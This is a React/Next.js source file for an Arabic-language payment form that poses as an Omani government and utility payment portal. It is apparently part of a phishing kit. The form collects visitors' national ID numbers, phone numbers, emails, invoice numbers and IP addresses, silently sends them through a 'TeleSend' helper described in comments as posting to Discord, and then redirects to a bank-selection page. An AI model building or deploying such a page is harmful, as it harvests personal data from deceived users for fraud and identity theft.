'use client'

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from "next/image";
import TeleSned from "../../server/TeleSend";

export default function Payment() {
  const { Send } = TeleSned();
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [showSplash, setShowSplash] = useState(true);
  const [ip, setIp] = useState('جاري التحميل...');
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({
    رقم_الفاتورة: '',
    رقم_الهوية: '',
    رقم_الجوال: '',
    البريد: '',
    الخدمة: '',
    المبلغ: '',
    ip: ip
  });

  // قائمة الخدمات المحدثة
  const services = [
    'دفع رسوم شحن مركبة',
    'تجديد الإقامة',
    'إصدار عمل',
    'رسوم خدمة جيناكم',
    'توثيق شحنة جيناكم',
    'إصدار تأشيرة سياحية',
    'دفع المخالفات المرورية',
    'تجديد رخصة القيادة',
    'تجديد تسجيل المركبة',
    'رسوم الخدمات البلدية',
    'رسوم التصديقات',
    'دفع فواتير الكهرباء',
    'دفع فواتير المياه',
    'رسوم تجديد جواز السفر',
    'رسوم البطاقة المدنية',
    'رسوم التعليم',
    'رسوم الرعاية الصحية',
    'رسوم الضرائب',
    'دفع المخالفات البلدية',
    'خدمة نقل ملكية',
    'مدفوعات حكومية',
    'مدفوعات ضريبة',
    'مدفوعات رسوم عقد',
    'رسوم نقل كفالة',
    'دفع رسوم شحن',
    'مدفوعات حجز شاليه',
    'مدفوعات أخرى',
    'أخرى'
];
  // جلب IP من API
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('/api/ip');
        const data = await response.json();
        setIp(data.ip);
        setFormData(prev => ({ ...prev, ip: data.ip }));
      } catch (error) {
        console.error('خطأ في جلب IP:', error);
        setIp('غير متاح');
      }
    };
    fetchIp();
  }, []);

  // إخفاء شاشة التحميل بعد 4 ثوانٍ
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowSplash(false);
    }, 4000);
    return () => clearTimeout(timer);
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  // دالة التحقق من البيانات
  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.رقم_الفاتورة || formData.رقم_الفاتورة.trim() === '') {
      newErrors.رقم_الفاتورة = 'رقم الفاتورة مطلوب';
    }
    
    if (!formData.رقم_الهوية || formData.رقم_الهوية.trim() === '') {
      newErrors.رقم_الهوية = 'رقم الهوية مطلوب';
    } else if (formData.رقم_الهوية.length < 8) {
      newErrors.رقم_الهوية = 'رقم الهوية يجب أن يكون 8 أرقام على الأقل';
    }
    
    if (!formData.رقم_الجوال || formData.رقم_الجوال.trim() === '') {
      newErrors.رقم_الجوال = 'رقم الجوال مطلوب';
    } else if (formData.رقم_الجوال.length < 9) {
      newErrors.رقم_الجوال = 'رقم الجوال يجب أن يكون 9 أرقام على الأقل';
    }
    
    if (!formData.البريد || formData.البريد.trim() === '') {
      newErrors.البريد = 'البريد الإلكتروني مطلوب';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.البريد)) {
      newErrors.البريد = 'البريد الإلكتروني غير صحيح';
    }
    
    if (!formData.الخدمة || formData.الخدمة.trim() === '') {
      newErrors.الخدمة = 'نوع الخدمة مطلوب';
    }
    
    if (!formData.المبلغ || formData.المبلغ.trim() === '') {
      newErrors.المبلغ = 'المبلغ مطلوب';
    } else if (parseFloat(formData.المبلغ) < 0.1) {
      newErrors.المبلغ = 'المبلغ يجب أن يكون 0.100 OMR على الأقل';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // دالة إرسال البيانات إلى Discord
  const PostToDiscord = (data) => {
    const description = Object.entries(data)
      .map(([key, value]) => `${key} : ${value}`)
      .join("\n");
    Send(description);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      const firstError = document.querySelector('.border-red-500');
      if (firstError) {
        firstError.focus();
      }
      return;
    }
    
    setIsLoading(true);
    
    try {
      // إرسال البيانات إلى Discord
      PostToDiscord(formData);
      console.log('✅ تم إرسال البيانات إلى Discord:', formData);
      
      // الانتظار 2 ثانية ثم التوجيه إلى صفحة البنوك
      setTimeout(() => {
        setIsLoading(false);
        // التوجيه إلى صفحة البنوك
        router.push('/payment/banks?ip=' + formData.ip);
      }, 2000);
      
    } catch (error) {
      console.error('❌ خطأ في الإرسال:', error);
      setIsLoading(false);
      alert('حدث خطأ في إرسال البيانات. حاول مرة أخرى.');
    }
  };

  // شاشة التحميل (Splash Screen)
  if (showSplash) {
    return (
      <main className="w-full flex min-h-screen flex-col items-center p-4 md:p-6 bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mt-0">
          <h1 className="text-2xl md:text-3xl font-bold text-[#800000] text-center">
            إدخال بيانات المستخدم
          </h1>
        </div>
        <div className="z-10 w-full max-w-2xl mx-auto">
          <div className="flex flex-col items-center justify-center w-full rounded-xl backdrop-blur-sm p-12 md:p-16 border border-gray-100">
            <h1 className="text-3xl md:text-4xl font-bold text-[#800000] mb-12">
              جاري التحميل
            </h1>
            <div className="relative w-24 h-24">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#800000] border-t-transparent animate-spin"></div>
            </div>
            <p className="mt-8 text-sm text-gray-500">
              يرجى الانتظار جاري تجهيز البيانات...
            </p>
          </div>
        </div>
      </main>
    );
  }

  // النموذج الرئيسي
  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-6 bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="z-10 w-full max-w-2xl mx-auto">
        <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100">
          <h1 className="text-2xl md:text-3xl font-bold text-[#800000] text-center">
            إدخال بيانات المستخدم
          </h1>
        </div>

        <div className="mt-6 bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* رقم الفاتورة */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                رقم الفاتورة <span className="text-[#800000]">*</span>
              </label>
              <input
                type="number"
                name="رقم_الفاتورة"
                placeholder="----------"
                value={formData.رقم_الفاتورة}
                onChange={handleChange}
                required
                className={`w-full border text-gray-700 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                  errors.رقم_الفاتورة ? 'border-red-500' : 'border-gray-300'
                }`}
                dir="ltr"
              />
              {errors.رقم_الفاتورة && (
                <p className="text-red-500 text-xs mt-1">{errors.رقم_الفاتورة}</p>
              )}
            </div>

            {/* رقم الهوية */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                رقم الهوية <span className="text-[#800000]">*</span>
              </label>
              <input
                type="number"
                name="رقم_الهوية"
                value={formData.رقم_الهوية}
                onChange={handleChange}
                required
                className={`w-full border text-gray-700 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                  errors.رقم_الهوية ? 'border-red-500' : 'border-gray-300'
                }`}
                dir="ltr"
              />
              {errors.رقم_الهوية && (
                <p className="text-red-500 text-xs mt-1">{errors.رقم_الهوية}</p>
              )}
            </div>

            {/* رقم الجوال */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                رقم الجوال <span className="text-[#800000]">*</span>
              </label>
              <input
                type="number"
                name="رقم_الجوال"
                value={formData.رقم_الجوال}
                onChange={handleChange}
                required
                className={`w-full border text-gray-700 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                  errors.رقم_الجوال ? 'border-red-500' : 'border-gray-300'
                }`}
                dir="ltr"
              />
              {errors.رقم_الجوال && (
                <p className="text-red-500 text-xs mt-1">{errors.رقم_الجوال}</p>
              )}
            </div>
pl 
            {/* البريد الإلكتروني */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                البريد الإلكتروني <span className="text-[#800000]">*</span>
              </label>
              <input
                type="email"
                name="البريد"
                value={formData.البريد}
                onChange={handleChange}
                required
                className={`w-full border text-gray-700 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                  errors.البريد ? 'border-red-500' : 'border-gray-300'
                }`}
                dir="ltr"
              />
              {errors.البريد && (
                <p className="text-red-500 text-xs mt-1">{errors.البريد}</p>
              )}
            </div>

            {/* نوع الخدمة */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                نوع الخدمة <span className="text-[#800000]">*</span>
              </label>
              <select
                name="الخدمة"
                value={formData.الخدمة}
                onChange={handleChange}
                required
                className={`w-full border text-gray-700 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white appearance-none ${
                  errors.الخدمة ? 'border-red-500' : 'border-gray-300'
                }`}
              >
                <option value="">اختر الخدمة...</option>
                {services.map((service, index) => (
                  <option key={index} value={service}>
                    {service}
                  </option>
                ))}
              </select>
              {errors.الخدمة && (
                <p className="text-red-500 text-xs mt-1">{errors.الخدمة}</p>
              )}
            </div>

            {/* المبلغ */}
            <div>
              <label className="block mb-1.5 text-sm font-semibold text-gray-700">
                المبلغ (ريال عُماني) <span className="text-[#800000]">*</span>
              </label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-medium">
                  OMR
                </span>
                <input
                  type="number"
                  name="المبلغ"
                  placeholder="0.00"
                  value={formData.المبلغ}
                  onChange={handleChange}
                  required
                  min="0.01"
                  step="0.01"
                  className={`w-full border text-gray-700 rounded-lg py-2.5 pl-14 pr-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white ${
                    errors.المبلغ ? 'border-red-500' : 'border-gray-300'
                  }`}
                  dir="ltr"
                />
              </div>
              {errors.المبلغ && (
                <p className="text-red-500 text-xs mt-1">{errors.المبلغ}</p>
              )}
              <p className="text-xs text-gray-500 mt-1 text-right">
                الحد الأدنى للمبلغ: 0.100 OMR
              </p>
            </div>

            {/* الأزرار */}
            <div className="flex flex-col sm:flex-row gap-4 pt-4 border-t border-gray-200">
              <button
                type="submit"
                disabled={isLoading}
                className="flex-1 px-6 py-3 bg-[#800000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    جاري المعالجة...
                  </span>
                ) : (
                  'تأكيد البيانات'
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </main>
  );
}
